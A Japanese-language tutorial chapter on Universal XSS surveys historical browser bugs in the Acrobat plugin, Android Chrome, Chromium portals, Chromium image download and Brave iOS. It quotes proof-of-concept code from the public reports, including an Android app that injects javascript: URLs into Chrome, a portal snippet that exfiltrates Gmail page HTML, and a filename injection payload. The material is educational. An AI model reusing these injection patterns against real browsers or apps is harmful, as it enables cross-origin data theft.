---
sidebar_position: 12
---

# 最強のXSS：Universal XSS

これまで説明したXSSの脆弱性は、ほとんどがウェブサイト自体の過失によって引き起こされ、攻撃者がウェブサイト上でJavaScriptコードを実行できるようになるものでした。

しかし、タイトルが示唆するように、さらに強力な別の種類のXSSがあります。

理由は単純です。この種類のXSS攻撃は、ウェブサイト自体ではなく、ブラウザまたは組み込みのプラグインを標的とするからです。

ブラウザの脆弱性であるため、ウェブサイト自体に問題がある必要はありません。純粋な静的ウェブページでもXSSに対して脆弱になる可能性があります。ブラウザを攻撃することで達成される影響は、「どのウェブサイトでもコードを実行できる能力」です。したがって、この種類の攻撃はUniversal XSS、略してUXSSと呼ばれます。

では、UXSSの脆弱性はどのように発生するのでしょうか？いくつかの例を見てみましょう。

## 2006年のFirefoxのAdobe Acrobatプラグイン

[Subverting Ajax](https://fahrplan.events.ccc.de/congress/2006/Fahrplan/attachments/1158-Subverting_Ajax.pdf)というタイトルの論文で、Firefoxを標的としたUXSSが説明されています。

FirefoxのAdobe Acrobatプラグインには、パラメータを適切にチェックしない脆弱性がありました。PDFを読み込む際に、URLに `#FDF=javascript:alert(1)` というパラメータを追加することで、そのPDF内でXSSを実行できました。

例えば、`https://example.com/test.pdf#FDF=javascript:alert(1)` です。このURLを読み込むだけで、`https://example.com` というオリジン上でJavaScriptコードが実行され、これがUXSSとして知られています。

元の論文には詳細な情報が記載されていませんでしたが、 underlying principle は、プラグインが `FDF` パラメータによって渡された値を使用して `window.open` などの関数を実行し、`javascript:` 疑似プロトコルを使用してコードを実行できるようにすることだと推測しています。

## 2012年のAndroid ChromeのUXSS

2012年、Takeshi氏は脆弱性を報告しました：[Issue 144813: Security: UXSS via com.android.browser.application_id Intent extra](https://bugs.chromium.org/p/chromium/issues/detail?id=144813)。

Androidの世界には、「インテント」と呼ばれるものがあり、これは「意図」を表します。例えば、新しい画面を開きたい場合は、「新しい画面を開きたい」というインテントを送信します。

Chromeを開いて特定のページを閲覧したい場合は、この意図に基づいて対応するコードを記述できます。

```java
// 新しいインテントを宣言します
Intent intent = new Intent("android.intent.action.VIEW");

// インテントはChromeアプリ用です
intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");

// URLを設定します
intent.setData(Uri.parse("https://example.com"));

// インテントを送信します
startActivity(intent);
```

2012年、誰かが最初に `https://example.com` を開き、次に `javascript:alert(1)` を開くことで、`https://example.com` のURL上でコードを実行できることを発見し、UXSSの脆弱性が発生しました。

完全なコードは次のとおりです（元のレポートからのコード）。

```java
package jp.mbsd.terada.attackchrome1;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.net.Uri;

public class Main extends Activity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        doit();
    }

    public void doit() {
        try {
            // まず、ChromeアプリにターゲットのWebページを開かせます
            Intent intent1 = getIntentForChrome("http://www.google.com/1");
            startActivity(intent1);

            // 数秒待ちます
            Thread.sleep(5000);

            // ターゲット（www.google.com）に注入するJSコード
            String jsURL = "javascript:alert('domain='+document.domain)";

            Intent intent2 = getIntentForChrome(jsURL);

            // Chromeが新しいURLを新しいタブで読み込むのを防ぐためのトリックが必要です
            intent2.putExtra("com.android.browser.application_id", "com.android.chrome");

            startActivity(intent2);
        }
        catch (Exception e) {}
    }

    // Chromeアプリを呼び出すためのインテントを取得します
    public Intent getIntentForChrome(String url) {
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");
        intent.setData(Uri.parse(url));
        return intent;
    }
}
```

## 2019年のChromiumのportalを介したUXSS

2019年、Michał Bentkowski氏は脆弱性を報告しました：[Issue 962500: Security: Same Origin Policy bypass and local file disclosure via portal element](https://bugs.chromium.org/p/chromium/issues/detail?id=962500&q=sop%20bypass&can=1)。このUXSSは、最新機能である `<portal>` を介して実行されました。

この脆弱性の原因は、前述のAndroidのケースと似ています。以下にコードスニペットの例を示します（元のレポートから）。

```js
const p = document.createElement('portal');
p.src = 'https://mail.google.com';
// しばらくしてから：
p.src = 'javascript:portalHost.postMessage(document.documentElement.outerHTML,"*")';
// 上記のコードはhttps://mail.google.comのコンテキストで実行されます
```

ポータル内にURLを読み込んだ後、`javascript:` を読み込むと、以前に読み込んだURLのオリジンでJavaScriptが実行されることになります。言い換えれば、任意のURLでJavaScriptを実行できるため、UXSSとなります。この脆弱性には10,000ドルの報奨金が支払われました。

## 2021年のChromiumの画像ダウンロードによってトリガーされるUXSS

Chromiumで画像を右クリックしてダウンロードを選択すると、ChromiumはバックグラウンドでJavaScriptコードの一部を動的に実行します。これは、次のような内部JavaScript関数を呼び出します。

```js
__gCrWeb.imageFetch.getImageData(id, '%s')
```

ここで、`%s` は画像のファイル名です。ただし、このファイル名は適切にフィルタリングされていなかったため、ファイル名が `'+alert(1)+'` の場合、コードは次のようになります。

```js
__gCrWeb.imageFetch.getImageData(id, ''+alert(1)+'')
```

これにより、`alert(1)` が実行されます。もちろん、任意のコードに置き換えることができます。`alert(1)` は単なる例です。

さらに、iframeを使用してドメインBを埋め込むドメインAがある場合、ドメインBで画像をダウンロードすると、この動的に生成されたJavaScriptコードはトップレベルウィンドウ、つまりドメインAのウィンドウで実行されます。

言い換えれば、この脆弱性を悪用することで、iframeを使用して別のドメインに攻撃URLを埋め込むことができれば、そのドメインで任意のコードを実行でき、UXSSが発生します。

元のレポートとPoCは、西村宗晃氏が報告したレポートを参照してください：[Issue 1164846: Security: ImageFetchTabHelper::GetImageDataByJs allows child frames to inject scripts into parent (UXSS)](https://bugs.chromium.org/p/chromium/issues/detail?id=1164846)

## BraveブラウザiOSアプリの複数のUXSS

BraveはChromiumベースのプライバシー重視のブラウザであり、JavaScriptの生みの親であるBrendan Eich氏によって設立されました。BraveのiOSアプリには、日本のセキュリティ研究者である西村宗晃氏によって複数のUXSS脆弱性が発見されています（上記のChromiumのUXSSも彼が報告しました）。

これらの脆弱性の原因は、前述のものと似ています。アプリ自体がJavaScriptコードを動的に実行し、入力が適切にフィルタリングされていないためにUXSSが発生しました。

例えば、次のようなコードの一部があるかもしれません。

```swift
self.tab?.webview?.evaluateJavaScript("u2f.postLowLevelRegister(\(requestId), \(true), '\(version)')")
```

そして、`version` 変数を制御できます。同時に、このスクリプトはトップレベルで実行されるため、サブフレームは親を攻撃し、他のオリジンでXSSを実行できます。

詳細については、西村宗晃氏のプレゼンテーションを参照してください：[Brave Browserの脆弱性を見つけた話（iOS編）](https://speakerdeck.com/nishimunea/brave-browsernocui-ruo-xing-wojian-tuketahua-iosbian)

## まとめ

このようなUXSSは、通常、ウェブサイト自体では制御できません。なぜなら、脆弱性はウェブサイトではなく、ブラウザ自体にあるからです。

ブラウザにとって、これは実際には重大な脆弱性です。考えてみてください。攻撃者がUXSSを悪用した場合、Gmailを読んだり、Facebookのメッセージを読んだり、すべてのデータを持ち去ったりすることができます。これは非常に恐ろしい状況です。

ユーザーとしてできることは、ブラウザを常に最新バージョンに更新し、ベンダーがこれらの脆弱性を迅速に修正することを願うことだけです。
